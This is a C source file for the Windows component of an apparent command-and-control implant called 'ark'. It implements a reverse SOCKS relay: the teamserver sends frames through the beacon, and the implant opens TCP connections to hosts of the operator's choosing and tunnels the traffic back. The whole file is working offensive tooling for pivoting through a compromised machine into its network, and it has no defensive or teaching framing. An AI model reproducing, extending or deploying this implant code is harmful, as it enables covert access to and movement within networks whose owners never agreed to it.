/*
 * Reverse SOCKS agent for Windows C implant.
 * Multiplexes TCP over beacon SocksFrames (same wire as Linux C / Go).
 *
 * - OPEN is async (worker thread) so the beacon loop never blocks on dial.
 * - Connect uses non-blocking + select with CONNECT_TIMEOUT_MS.
 * - SOCKET lifecycle: generation counter; only the matching gen closes/uses a slot.
 * - Writes hold g_mu so the SOCKET cannot be closed mid-send.
 * - Targets: host:port, IPv4:port, [IPv6]:port (bare IPv6 rejected).
 * - Does not listen; teamserver is the SOCKS5 hub.
 */
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "ark/pb_c2.h"
#include "ark/pb_wire.h"
#include "ark/socks.h"
#include "ark/task_handlers.h"

#define MAX_CONNS            64
#define MAX_OUT              256
#define CONNECT_TIMEOUT_MS   8000

static int socks_dbg(void) {
    static int v = -1;
    if (v < 0) {
        const char *e = getenv("ARK_SOCKS_DEBUG");
        v = (e && e[0] == '1') ? 1 : 0;
    }
    return v;
}
#define SDBG(...) do { if (socks_dbg()) fprintf(stderr, "[socks] " __VA_ARGS__); } while (0)

typedef struct {
    uint32_t conn_id;
    uint32_t gen;
    SOCKET   fd;
    int      in_use;
} socks_conn;

typedef struct {
    uint32_t conn_id;
    uint32_t gen;
} reader_arg;

typedef struct {
    uint32_t conn_id;
    char     target[ARK_SOCKS_MAX_TARGET];
} open_arg;

static CRITICAL_SECTION g_mu;
static volatile LONG g_mu_ready;
static volatile LONG g_wsa;
static int g_relay;
static socks_conn g_conns[MAX_CONNS];
static ark_socks_frame g_out[MAX_OUT];
static size_t g_out_n;

static void socks_lock_init(void) {
    if (InterlockedCompareExchange(&g_mu_ready, 1, 0) == 0) {
        InitializeCriticalSection(&g_mu);
        InterlockedExchange(&g_mu_ready, 2);
    } else {
        while (InterlockedCompareExchange(&g_mu_ready, 2, 2) != 2)
            Sleep(0);
    }
}

static void ensure_wsa(void) {
    if (InterlockedCompareExchange(&g_wsa, 1, 0) == 0) {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
            InterlockedExchange(&g_wsa, 0);
    }
}

static void free_frame_data(ark_socks_frame *f) {
    free(f->data);
    f->data = NULL;
    f->data_len = 0;
}

void ark_socks_frames_free(ark_socks_frame *frames, size_t count) {
    if (!frames) return;
    for (size_t i = 0; i < count; i++)
        free_frame_data(&frames[i]);
    free(frames);
}

static int enqueue_locked(const ark_socks_frame *src) {
    if (g_out_n >= MAX_OUT) {
        size_t drop = 0;
        for (size_t i = 0; i < g_out_n; i++) {
            if (g_out[i].op == ARK_SOCKS_DATA) {
                drop = i;
                break;
            }
        }
        free_frame_data(&g_out[drop]);
        if (drop + 1 < g_out_n)
            memmove(&g_out[drop], &g_out[drop + 1], (g_out_n - drop - 1) * sizeof(g_out[0]));
        g_out_n--;
    }
    ark_socks_frame *d = &g_out[g_out_n];
    memset(d, 0, sizeof(*d));
    d->conn_id = src->conn_id;
    d->op = src->op;
    d->status = src->status;
    if (src->target[0])
        memcpy(d->target, src->target, sizeof(d->target) - 1);
    if (src->data && src->data_len > 0) {
        size_t n = src->data_len;
        if (n > ARK_SOCKS_MAX_FRAME_DATA)
            n = ARK_SOCKS_MAX_FRAME_DATA;
        d->data = (uint8_t *)malloc(n);
        if (!d->data) return 0;
        memcpy(d->data, src->data, n);
        d->data_len = n;
    }
    g_out_n++;
    return 1;
}

static void enqueue(uint32_t conn_id, int32_t op, const char *target,
                    const uint8_t *data, size_t data_len, int32_t status) {
    ark_socks_frame f;
    memset(&f, 0, sizeof(f));
    f.conn_id = conn_id;
    f.op = op;
    f.status = status;
    if (target)
        strncpy(f.target, target, sizeof(f.target) - 1);
    f.data = (uint8_t *)(uintptr_t)data;
    f.data_len = data_len;
    socks_lock_init();
    EnterCriticalSection(&g_mu);
    enqueue_locked(&f);
    LeaveCriticalSection(&g_mu);
}

int ark_socks_active(void) {
    socks_lock_init();
    EnterCriticalSection(&g_mu);
    int active = g_relay;
    if (!active) {
        for (int i = 0; i < MAX_CONNS; i++) {
            if (g_conns[i].in_use) {
                active = 1;
                break;
            }
        }
    }
    LeaveCriticalSection(&g_mu);
    return active;
}

void ark_socks_drain(ark_socks_frame **out, size_t *count) {
    *out = NULL;
    *count = 0;
    socks_lock_init();
    EnterCriticalSection(&g_mu);
    if (g_out_n == 0) {
        LeaveCriticalSection(&g_mu);
        return;
    }
    ark_socks_frame *buf = (ark_socks_frame *)calloc(g_out_n, sizeof(*buf));
    if (!buf) {
        LeaveCriticalSection(&g_mu);
        return;
    }
    memcpy(buf, g_out, g_out_n * sizeof(*buf));
    *count = g_out_n;
    *out = buf;
    memset(g_out, 0, sizeof(g_out));
    g_out_n = 0;
    LeaveCriticalSection(&g_mu);
}

void ark_socks_requeue(ark_socks_frame *frames, size_t count) {
    if (!frames || count == 0) return;
    socks_lock_init();
    EnterCriticalSection(&g_mu);
    size_t old_n = g_out_n;
    ark_socks_frame old[MAX_OUT];
    if (old_n > 0)
        memcpy(old, g_out, old_n * sizeof(old[0]));
    g_out_n = 0;
    memset(g_out, 0, sizeof(g_out));
    for (size_t i = 0; i < count; i++)
        (void)enqueue_locked(&frames[i]);
    for (size_t i = 0; i < old_n; i++)
        (void)enqueue_locked(&old[i]);
    for (size_t i = 0; i < old_n; i++)
        free_frame_data(&old[i]);
    LeaveCriticalSection(&g_mu);
    for (size_t i = 0; i < count; i++)
        free_frame_data(&frames[i]);
    free(frames);
}

static void close_conn_locked(uint32_t conn_id, uint32_t gen, int match_gen) {
    for (int i = 0; i < MAX_CONNS; i++) {
        if (!g_conns[i].in_use || g_conns[i].conn_id != conn_id)
            continue;
        if (match_gen && g_conns[i].gen != gen)
            return;
        if (g_conns[i].fd != INVALID_SOCKET) {
            (void)shutdown(g_conns[i].fd, SD_BOTH);
            closesocket(g_conns[i].fd);
        }
        g_conns[i].fd = INVALID_SOCKET;
        g_conns[i].in_use = 0;
        g_conns[i].gen++;
        return;
    }
}

static int store_conn_locked(uint32_t conn_id, SOCKET fd, uint32_t *out_gen) {
    for (int i = 0; i < MAX_CONNS; i++) {
        if (g_conns[i].in_use && g_conns[i].conn_id == conn_id) {
            if (g_conns[i].fd != INVALID_SOCKET)
                closesocket(g_conns[i].fd);
            g_conns[i].fd = fd;
            g_conns[i].gen++;
            if (out_gen) *out_gen = g_conns[i].gen;
            return 1;
        }
    }
    for (int i = 0; i < MAX_CONNS; i++) {
        if (!g_conns[i].in_use) {
            g_conns[i].in_use = 1;
            g_conns[i].conn_id = conn_id;
            g_conns[i].fd = fd;
            g_conns[i].gen++;
            if (out_gen) *out_gen = g_conns[i].gen;
            return 1;
        }
    }
    return 0;
}

static SOCKET dial_timeout(const char *host, const char *port, int timeout_ms) {
    struct addrinfo hints, *res = NULL, *ai;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, port, &hints, &res) != 0)
        return INVALID_SOCKET;

    SOCKET fd = INVALID_SOCKET;
    for (ai = res; ai; ai = ai->ai_next) {
        fd = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (fd == INVALID_SOCKET)
            continue;
        u_long nb = 1;
        if (ioctlsocket(fd, FIONBIO, &nb) != 0) {
            closesocket(fd);
            fd = INVALID_SOCKET;
            continue;
        }
        int rc = connect(fd, ai->ai_addr, (int)ai->ai_addrlen);
        if (rc == 0)
            break;
        int err = WSAGetLastError();
        if (err != WSAEWOULDBLOCK && err != WSAEINPROGRESS) {
            closesocket(fd);
            fd = INVALID_SOCKET;
            continue;
        }
        fd_set wset, eset;
        FD_ZERO(&wset);
        FD_ZERO(&eset);
        FD_SET(fd, &wset);
        FD_SET(fd, &eset);
        struct timeval tv;
        tv.tv_sec = timeout_ms / 1000;
        tv.tv_usec = (timeout_ms % 1000) * 1000;
        int pr = select(0, NULL, &wset, &eset, &tv);
        if (pr <= 0) {
            closesocket(fd);
            fd = INVALID_SOCKET;
            continue;
        }
        int soerr = 0;
        int sl = (int)sizeof(soerr);
        if (getsockopt(fd, SOL_SOCKET, SO_ERROR, (char *)&soerr, &sl) != 0 || soerr != 0) {
            closesocket(fd);
            fd = INVALID_SOCKET;
            continue;
        }
        break;
    }
    freeaddrinfo(res);

    if (fd == INVALID_SOCKET)
        return INVALID_SOCKET;
    u_long block = 0;
    (void)ioctlsocket(fd, FIONBIO, &block);
    return fd;
}

static DWORD WINAPI reader_thread(LPVOID arg) {
    reader_arg *ra = (reader_arg *)arg;
    uint32_t conn_id = ra->conn_id;
    uint32_t gen = ra->gen;
    free(ra);

    uint8_t buf[ARK_SOCKS_MAX_FRAME_DATA];
    for (;;) {
        SOCKET fd = INVALID_SOCKET;
        EnterCriticalSection(&g_mu);
        for (int i = 0; i < MAX_CONNS; i++) {
            if (g_conns[i].in_use && g_conns[i].conn_id == conn_id && g_conns[i].gen == gen) {
                fd = g_conns[i].fd;
                break;
            }
        }
        LeaveCriticalSection(&g_mu);
        if (fd == INVALID_SOCKET)
            return 0;

        int n = recv(fd, (char *)buf, (int)sizeof(buf), 0);
        if (n > 0) {
            SDBG("reader conn=%u gen=%u read %d bytes\n", conn_id, gen, n);
            enqueue(conn_id, ARK_SOCKS_DATA, NULL, buf, (size_t)n, 0);
            continue;
        }
        SDBG("reader conn=%u gen=%u EOF/err n=%d wsa=%d\n", conn_id, gen, n, WSAGetLastError());
        EnterCriticalSection(&g_mu);
        close_conn_locked(conn_id, gen, 1);
        LeaveCriticalSection(&g_mu);
        if (n < 0)
            enqueue(conn_id, ARK_SOCKS_CLOSE, NULL, NULL, 0, 0);
        return 0;
    }
}

static int spawn_reader(uint32_t conn_id, uint32_t gen) {
    reader_arg *ra = (reader_arg *)malloc(sizeof(*ra));
    if (!ra) return 0;
    ra->conn_id = conn_id;
    ra->gen = gen;
    HANDLE th = CreateThread(NULL, 0, reader_thread, ra, 0, NULL);
    if (!th) {
        free(ra);
        return 0;
    }
    CloseHandle(th);
    return 1;
}

static DWORD WINAPI open_thread(LPVOID arg) {
    open_arg *oa = (open_arg *)arg;
    uint32_t conn_id = oa->conn_id;
    char target[ARK_SOCKS_MAX_TARGET];
    memcpy(target, oa->target, sizeof(target));
    free(oa);

    char host[ARK_SOCKS_MAX_TARGET];
    char port[16];
    if (!ark_socks_parse_host_port(target, host, sizeof(host), port, sizeof(port))) {
        enqueue(conn_id, ARK_SOCKS_OPEN_RESULT, NULL, NULL, 0, -1);
        return 0;
    }

    SOCKET fd = dial_timeout(host, port, CONNECT_TIMEOUT_MS);
    if (fd == INVALID_SOCKET) {
        SDBG("open conn=%u dial fail target=%s\n", conn_id, target);
        enqueue(conn_id, ARK_SOCKS_OPEN_RESULT, NULL, NULL, 0, -1);
        return 0;
    }

    uint32_t gen = 0;
    EnterCriticalSection(&g_mu);
    if (!g_relay) {
        LeaveCriticalSection(&g_mu);
        closesocket(fd);
        SDBG("open conn=%u relay off\n", conn_id);
        enqueue(conn_id, ARK_SOCKS_OPEN_RESULT, NULL, NULL, 0, -1);
        return 0;
    }
    if (!store_conn_locked(conn_id, fd, &gen)) {
        LeaveCriticalSection(&g_mu);
        closesocket(fd);
        SDBG("open conn=%u store fail\n", conn_id);
        enqueue(conn_id, ARK_SOCKS_OPEN_RESULT, NULL, NULL, 0, -1);
        return 0;
    }
    LeaveCriticalSection(&g_mu);

    if (!spawn_reader(conn_id, gen)) {
        EnterCriticalSection(&g_mu);
        close_conn_locked(conn_id, gen, 1);
        LeaveCriticalSection(&g_mu);
        SDBG("open conn=%u spawn reader fail\n", conn_id);
        enqueue(conn_id, ARK_SOCKS_OPEN_RESULT, NULL, NULL, 0, -1);
        return 0;
    }

    SDBG("open conn=%u gen=%u OK target=%s\n", conn_id, gen, target);
    enqueue(conn_id, ARK_SOCKS_OPEN_RESULT, NULL, NULL, 0, 0);
    return 0;
}

static void socks_open_async(uint32_t conn_id, const char *target) {
    if (!target || !target[0]) {
        enqueue(conn_id, ARK_SOCKS_OPEN_RESULT, NULL, NULL, 0, -1);
        return;
    }
    open_arg *oa = (open_arg *)malloc(sizeof(*oa));
    if (!oa) {
        enqueue(conn_id, ARK_SOCKS_OPEN_RESULT, NULL, NULL, 0, -1);
        return;
    }
    oa->conn_id = conn_id;
    memset(oa->target, 0, sizeof(oa->target));
    strncpy(oa->target, target, sizeof(oa->target) - 1);

    HANDLE th = CreateThread(NULL, 0, open_thread, oa, 0, NULL);
    if (!th) {
        free(oa);
        enqueue(conn_id, ARK_SOCKS_OPEN_RESULT, NULL, NULL, 0, -1);
        return;
    }
    CloseHandle(th);
}

static void socks_write(uint32_t conn_id, const uint8_t *data, size_t data_len) {
    if (!data || data_len == 0) return;

    socks_lock_init();
    EnterCriticalSection(&g_mu);
    SOCKET fd = INVALID_SOCKET;
    uint32_t gen = 0;
    for (int i = 0; i < MAX_CONNS; i++) {
        if (g_conns[i].in_use && g_conns[i].conn_id == conn_id) {
            fd = g_conns[i].fd;
            gen = g_conns[i].gen;
            break;
        }
    }
    if (fd == INVALID_SOCKET) {
        LeaveCriticalSection(&g_mu);
        SDBG("write conn=%u NO FD (len=%zu)\n", conn_id, data_len);
        return;
    }
    LeaveCriticalSection(&g_mu);

    size_t off = 0;
    int fail = 0;
    while (off < data_len) {
        int n = send(fd, (const char *)(data + off), (int)(data_len - off), 0);
        if (n < 0) {
            int err = WSAGetLastError();
            if (err == WSAEINTR) continue;
            fail = 1;
            SDBG("write conn=%u fail wsa=%d off=%zu/%zu\n", conn_id, err, off, data_len);
            break;
        }
        if (n == 0) {
            fail = 1;
            break;
        }
        off += (size_t)n;
    }

    EnterCriticalSection(&g_mu);
    int still = 0;
    for (int i = 0; i < MAX_CONNS; i++) {
        if (g_conns[i].in_use && g_conns[i].conn_id == conn_id && g_conns[i].gen == gen) {
            still = 1;
            break;
        }
    }
    if (fail && still)
        close_conn_locked(conn_id, gen, 1);
    else if (!fail)
        SDBG("write conn=%u gen=%u wrote %zu bytes\n", conn_id, gen, data_len);
    LeaveCriticalSection(&g_mu);

    if (fail && still)
        enqueue(conn_id, ARK_SOCKS_CLOSE, NULL, NULL, 0, 0);
}

static void socks_close_local(uint32_t conn_id) {
    socks_lock_init();
    EnterCriticalSection(&g_mu);
    close_conn_locked(conn_id, 0, 0);
    LeaveCriticalSection(&g_mu);
}

void ark_socks_handle(const ark_socks_frame *frames, size_t count) {
    if (!frames) return;
    ensure_wsa();
    SDBG("handle %zu frame(s)\n", count);
    for (size_t i = 0; i < count; i++) {
        const ark_socks_frame *f = &frames[i];
        SDBG("  frame[%zu] conn=%u op=%d data_len=%zu target=%s\n",
             i, f->conn_id, f->op, f->data_len, f->target[0] ? f->target : "-");
        switch (f->op) {
        case ARK_SOCKS_OPEN:
            socks_open_async(f->conn_id, f->target);
            break;
        case ARK_SOCKS_DATA:
            socks_write(f->conn_id, f->data, f->data_len);
            break;
        case ARK_SOCKS_CLOSE:
            socks_close_local(f->conn_id);
            break;
        default:
            break;
        }
    }
}

void ark_socks_shutdown(void) {
    socks_lock_init();
    EnterCriticalSection(&g_mu);
    g_relay = 0;
    for (int i = 0; i < MAX_CONNS; i++) {
        if (g_conns[i].in_use) {
            if (g_conns[i].fd != INVALID_SOCKET) {
                (void)shutdown(g_conns[i].fd, SD_BOTH);
                closesocket(g_conns[i].fd);
            }
            g_conns[i].fd = INVALID_SOCKET;
            g_conns[i].in_use = 0;
            g_conns[i].gen++;
        }
    }
    for (size_t i = 0; i < g_out_n; i++)
        free_frame_data(&g_out[i]);
    g_out_n = 0;
    memset(g_out, 0, sizeof(g_out));
    LeaveCriticalSection(&g_mu);
}

int ark_task_socks_start(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    uint32_t port = 1080;
    if (data_len > 0) {
        ark_pb_reader r;
        ark_pb_reader_init(&r, data, data_len);
        uint32_t field;
        uint8_t wire;
        while (ark_pb_reader_next(&r, &field, &wire)) {
            uint64_t v;
            if (field == 1 && wire == 0 && ark_pb_read_varint(&r, &v))
                port = (uint32_t)v;
            else if (!ark_pb_skip(&r, wire))
                break;
        }
    }
    ensure_wsa();
    socks_lock_init();
    EnterCriticalSection(&g_mu);
    g_relay = 1;
    LeaveCriticalSection(&g_mu);
    return ark_pb_encode_socks_start_result(1, port, out, out_len);
}

int ark_task_socks_stop(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    (void)data;
    (void)data_len;
    ark_socks_shutdown();
    return ark_pb_encode_socks_stop_result(1, out, out_len);
}
